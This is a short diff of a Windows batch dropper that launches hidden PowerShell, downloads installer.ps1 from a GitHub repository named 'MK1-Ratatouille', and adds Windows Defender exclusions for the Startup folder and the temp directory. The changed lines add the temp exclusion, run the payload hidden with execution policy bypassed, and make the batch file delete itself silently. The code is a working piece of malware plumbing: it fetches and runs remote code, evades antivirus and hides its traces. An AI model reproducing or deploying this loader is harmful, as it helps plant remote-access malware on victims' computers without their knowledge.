@@ -50,10 +50,12 @@ powershell -windowstyle hidden -c ^
 "try { ^
     Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/installer.ps1' -OutFile 'installer.ps1'; ^
     Add-MpPreference -ExclusionPath '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup'; ^
-    .\installer.ps1; ^
+    Add-MpPreference -ExclusionPath '$env:temp'^
+    powershell powershell.exe -windowstyle hidden -ep bypass .\installer.ps1; ^
 } catch { ^
     Write-Error 'An error occurred: ' + $_.Exception.Message; ^
 }"
 
 REM self delete
-del "%~f0"
+@REM 
+start /b "" cmd /c del "%~f0"&exit
